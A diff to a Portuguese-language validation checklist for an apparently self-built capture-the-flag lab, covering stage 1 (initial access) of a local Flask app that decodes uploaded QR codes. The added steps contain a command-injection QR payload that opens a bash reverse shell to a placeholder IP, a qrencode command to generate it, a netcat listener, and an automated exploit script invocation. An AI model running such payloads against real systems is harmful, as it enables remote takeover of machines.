@@ -19,13 +19,33 @@ docker compose logs -f   # acompanhar inicialização
 
 ## Etapa 1 — Acesso inicial
 
+Implementada. Validação manual:
+
 - [ ] Acessar `http://localhost:8000` no navegador.
-- [ ] Gerar QR Code com payload de reverse shell (comando exato a documentar aqui
-      após a implementação do decoder, considerando o ciclo imagem → decode → shell).
-- [ ] Subir listener local (`nc -lvnp <porta>`) antes do upload.
-- [ ] Fazer upload da imagem do QR Code.
-- [ ] Confirmar shell recebido como `ru_web`.
+- [ ] Gerar uma imagem de QR Code contendo, por exemplo:
+      `0; bash -c 'bash -i >& /dev/tcp/SEU_IP/4444 0>&1'`
+      (qualquer gerador de QR Code a partir de texto serve, ex.: `qrencode -o payload.png "0; bash -c 'bash -i >& /dev/tcp/SEU_IP/4444 0>&1'"`).
+- [ ] Subir listener local antes do upload: `nc -lvnp 4444`.
+- [ ] Fazer upload da imagem do QR Code em `http://localhost:8000`.
+- [ ] Confirmar shell recebida como `ru_web` (`whoami`).
 - [ ] Ler `/home/ru_web/user.txt` (flag 1).
+
+Validação automatizada (requer o container no ar — ver `tests/exploit_etapa1.py`):
+
+```bash
+cd tests
+pip install -r requirements.txt
+python3 exploit_etapa1.py --target-url http://localhost:8000 \
+  --listen-host host.docker.internal --listen-port 4444
+```
+
+Testes em camadas (sem precisar do container; rodados nesta sessão de design):
+
+```bash
+cd tests
+python3 test_decode_qr.py     # camada 1: ciclo QR (gerar imagem -> decodificar) isolado
+python3 test_app_client.py    # camada 2: Flask app.test_client(), sem rede/container
+```
 
 ## Etapa 2 — Pivot até o painel
 
